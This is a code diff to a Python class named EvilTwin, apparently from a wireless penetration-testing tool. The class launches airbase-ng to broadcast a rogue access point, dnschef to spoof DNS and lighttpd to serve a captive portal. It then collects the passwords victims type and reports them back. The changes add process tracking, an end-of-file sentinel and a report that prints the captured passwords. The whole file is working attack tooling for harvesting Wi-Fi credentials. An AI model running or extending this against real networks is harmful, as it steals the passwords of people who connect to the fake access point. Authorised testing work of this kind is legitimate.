@@ -1,9 +1,10 @@
 
 import sys
 import time
-from Model.Attacks.AbstractAttack import AbstractAttack
+from Model.Attacks.AbstractAttack import AbstractAttack, AttackResultInfo
 import subprocess as sb
 from threading import Thread
+import Model.utils as utl
 
 class EvilTwin(AbstractAttack):
     AIRBASE_MESSAGE = 'airbase-ng'
@@ -12,11 +13,24 @@ class EvilTwin(AbstractAttack):
 
     PROCESS_NAMES = [AIRBASE_MESSAGE, DNSCHEF_MESSAGE, LIGHTTPD_MESSAGE]
 
+    PASSWORDS_FILE = "www/ag.et_attempts.txt"
     TIMEOUT = sys.maxsize #infinite
 
     @classmethod
     def attack_name(cls) -> str:
         return 'Evil twin captive portal'
+
+    @classmethod
+    def description(cls, result: bool):
+        with open(cls.PASSWORDS_FILE, "r") as f:
+            pass_found = f.read()
+
+        desc = ""
+        if result:
+            desc = "Evil twin has captured these paswords: " + pass_found
+        else:
+            desc += "Evil twin has captured these paswords: " + pass_found
+        return desc
 
     @classmethod
     def execute_attack(cls, q, kwargs) -> bool:
@@ -44,15 +58,26 @@ class EvilTwin(AbstractAttack):
         lighttpd_t.start()
 
         file_position = 0
+        try:
+            while True:
+                time.sleep(2)
+                with open('www/ag.et_attempts.txt', 'r') as f:
+                    f.seek(file_position)  # fast forward beyond content read previously
+                    for line in f:
+                        print(line)
+                        print(line=='EOF\n')
+                        if line == 'EOF\n':
+                            raise Exception
+                        q.put('Password attempt captured!\n')
+                        q.put(line)
 
-        while True:
-            with open('www/ag.et_attempts.txt', 'r') as f:
-                f.seek(file_position)  # fast forward beyond content read previously
-                for line in f:
-                    q.put('Password attempt captured!\n')
-                    q.put(line)
-
-                file_position = f.tell()  # store position at which to resume
+                    file_position = f.tell()  # store position at which to resume
+        except:
+            result = AttackResultInfo()
+            result.attack = cls.attack_name()
+            result.risk = 'Medium'
+            result.desc = cls.description(True)
+            q.put(result)                    
 
 
     @classmethod
@@ -61,10 +86,11 @@ class EvilTwin(AbstractAttack):
         cmd = ['airbase-ng', '-e', 'Pentesting-2.4ghz', '-c', '6', 'wlan0mon']
         p = sb.Popen(["stdbuf","-i0","-o0","-e0"] + cmd, stdout=sb.PIPE, text=True)
 
+        with open(utl.pids_file, "a") as f:
+            f.write(str(p.pid) + "\n")
+
         for line in p.stdout:
             q.put((cls.AIRBASE_MESSAGE, line))
-
-        p.kill()
 
     @classmethod
     def set_up_at0(cls):
@@ -95,22 +121,28 @@ class EvilTwin(AbstractAttack):
         cmd = ["dnschef", "--interface", "192.169.1.1", "--fakeip", "192.169.1.1"]
         p = sb.Popen(["stdbuf","-i0","-o0","-e0"] + cmd, stdout=sb.PIPE, stderr=sb.PIPE, text=True)
 
+        with open(utl.pids_file, "a") as f:
+            f.write(str(p.pid) + "\n")
+
         for line in p.stderr:
             q.put((cls.DNSCHEF_MESSAGE, line))
 
         for line in p.stdout:
             q.put((cls.DNSCHEF_MESSAGE, line))
 
-        p.kill()
 
     @classmethod
     def init_lighttpd(cls, q):
         cmd = ["lighttpd", "-D", "-f", "Model/files/ag.lighttpd.conf"]
         p = sb.Popen(["stdbuf","-i0","-o0","-e0"] + cmd, stdout=sb.PIPE, stderr=sb.PIPE, text=True)
+
+        with open(utl.pids_file, "a") as f:
+            f.write(str(p.pid) + "\n")
+
         for line in p.stderr:
             q.put((cls.LIGHTTPD_MESSAGE, line))
         for line in p.stdout:
             q.put((cls.LIGHTTPD_MESSAGE, line))
-
-        p.kill()
-            
+        
+        with open('www/ag.et_attempts.txt', "a") as f:
+            f.write('EOF\n')
